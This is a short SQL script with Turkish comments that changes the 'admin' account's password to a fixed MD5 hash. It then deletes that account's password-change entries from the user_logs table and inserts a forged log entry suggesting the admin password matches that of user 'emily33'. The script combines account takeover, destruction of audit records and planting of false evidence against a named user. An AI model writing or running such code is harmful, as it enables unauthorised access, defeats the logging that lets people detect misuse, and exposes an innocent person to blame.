-- 1. admin şifresini "oops!" olarak değiştir (MD5 hash'i: 7c6a180b36896a0a8c02787eeafb0e4c)
UPDATE users
SET password = '7c6a180b36896a0a8c02787eeafb0e4c'
WHERE username = 'admin';

-- 2. şifre değişikliğiyle ilgili logları sil
DELETE FROM user_logs
WHERE user_id = (
    SELECT id FROM users WHERE username = 'admin'
)
AND type = 'update';

-- 3. admin'in şifresi sanki emily33'ünki olmuş gibi sahte bir kayıt ekle
INSERT INTO user_logs (user_id, type, password)
SELECT
    (SELECT id FROM users WHERE username = 'admin'),
    'update',
    (SELECT password FROM users WHERE username = 'emily33');
